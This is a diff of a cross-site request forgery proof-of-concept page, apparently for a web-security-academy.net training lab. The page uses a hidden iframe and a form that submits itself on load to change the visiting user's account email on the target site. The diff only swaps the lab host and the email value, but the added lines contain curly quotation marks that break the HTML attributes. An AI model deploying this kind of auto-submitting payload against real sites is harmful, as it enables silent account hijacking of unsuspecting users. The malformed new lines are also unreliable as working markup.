@@ -2,10 +2,12 @@
     <body>
         <h1>Hello World!</h1>
         <iframe style="display:none" name="csrf-iframe"></iframe>
-        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
-            <input type="hidden" name="email" value="test5@test.ca">
+        <form action="https://0a3e00bb04f2d42b82a4376e008900b2.web-security-academy.net/my-account/change-email”  method="POST"
+target="csrf-iframe" id="csrf-form”>
+<input type="hidden" name="email" value="loka%40google.com">
         </form>
 
         <script>document.getElementById("csrf-form").submit()</script>
     </body>
 </html>
+
